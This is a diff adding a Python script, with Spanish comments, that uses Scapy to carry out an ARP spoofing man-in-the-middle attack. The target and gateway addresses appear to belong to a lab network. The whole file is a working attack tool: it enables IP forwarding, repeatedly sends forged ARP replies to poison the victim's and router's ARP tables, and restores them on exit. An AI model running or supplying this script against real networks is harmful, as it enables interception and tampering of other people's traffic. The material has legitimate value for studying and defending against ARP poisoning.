@@ -1,0 +1,107 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from scapy.all import *
+import time
+import sys
+import os
+
+# --- CONFIGURACIÓN ---
+# La IP y la MAC del router (gateway)
+target_ip_gateway = "10.24.14.1" 
+target_mac_gateway = "c2:01:3a:08:00:00" 
+
+# La IP y la MAC de la víctima
+target_ip_victim = "10.24.14.3"
+target_mac_victim = "00:50:79:66:68:00" 
+
+# El número de paquetes a enviar en cada iteración
+packet_count = 2
+
+# --- FIN DE LA CONFIGURACIÓN ---
+
+
+def get_mac(ip_address):
+    """Obtiene la dirección MAC de una IP usando ARP."""
+    try:
+        answered, unanswered = srp(ARP(pdst=ip_address), timeout=2, retry=10, verbose=False)
+        if answered:
+            return answered[0][1].hwsrc
+        else:
+            print(f"[!] No se pudo obtener la MAC para la IP: {ip_address}")
+            return None
+    except Exception as e:
+        print(f"[!] Error al obtener la MAC para {ip_address}: {e}")
+        return None
+
+def restore_arp(target_ip, target_mac, source_ip, source_mac):
+    """Restaura la tabla ARP de los objetivos a su estado original."""
+    print(f"[*] Restaurando tabla ARP para {target_ip}...")
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+    send(packet, count=5, verbose=False)
+    print(f"[+] Tabla ARP restaurada para {target_ip}")
+
+def spoof_arp(target_ip, target_mac, source_ip, attacker_mac):
+    """Envía paquetes ARP falsificados a un objetivo."""
+    # Creamos un paquete ARP response (op=2) para engañar al objetivo
+    # Le decimos que la IP 'source_ip' ahora tiene nuestra MAC (attacker_mac)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=attacker_mac)
+    send(packet, verbose=False)
+
+def main():
+    # --- Habilitar IP Forwarding ---
+    print("[*] Habilitando IP Forwarding...")
+    try:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] IP Forwarding habilitado.")
+    except Exception as e:
+        print(f"[!] No se pudo habilitar IP Forwarding. Error: {e}")
+        print("[!] Asegúrate de ejecutar el script como root (sudo).")
+        sys.exit(1)
+
+    # --- Obtener nuestra propia MAC e interfaz ---
+    try:
+        # Usamos la tabla de rutas de Scapy para encontrar la interfaz de salida hacia el gateway
+        iface = conf.route.route(target_ip_gateway)[0]
+        # Obtenemos la MAC de esa interfaz específica
+        attacker_mac = get_if_hwaddr(iface)
+        print(f"[*] Interfaz usada: {iface}")
+        print(f"[*] Tu MAC: {attacker_mac}")
+    except Exception as e:
+        print(f"[!] Error al obtener la información de la interfaz de red: {e}")
+        print("[!] Asegúrate de que la IP del gateway es correcta y accesible.")
+        sys.exit(1)
+
+    # --- Iniciar el ataque ---
+    print("\n--- Iniciando ataque ARP Spoofing ---")
+    print(f"[*] Víctima: {target_ip_victim} ({target_mac_victim})")
+    print(f"[*] Gateway: {target_ip_gateway} ({target_mac_gateway})")
+    print("------------------------------------")
+    print("[*] Enviando paquetes ARP falsificados... Presiona CTRL+C para detener y restaurar.")
+    
+    try:
+        while True:
+            # Engañamos a la víctima para que piense que somos el router
+            spoof_arp(target_ip_victim, target_mac_victim, target_ip_gateway, attacker_mac)
+            
+            # Engañamos al router para que piense que somos la víctima
+            spoof_arp(target_ip_gateway, target_mac_gateway, target_ip_victim, attacker_mac)
+            
+            time.sleep(2)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Ataque detenido por el usuario.")
+        print("[*] Restaurando tablas ARP...")
+        # Restauramos la tabla ARP de la víctima
+        restore_arp(target_ip_victim, target_mac_victim, target_ip_gateway, target_mac_gateway)
+        # Restauramos la tabla ARP del router
+        restore_arp(target_ip_gateway, target_mac_gateway, target_ip_victim, target_mac_victim)
+        print("[+] Tablas ARP restauradas. Saliendo.")
+        
+        # --- Deshabilitar IP Forwarding ---
+        print("[*] Deshabilitando IP Forwarding...")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] IP Forwarding deshabilitado.")
+
+if __name__ == "__main__":
+    main()
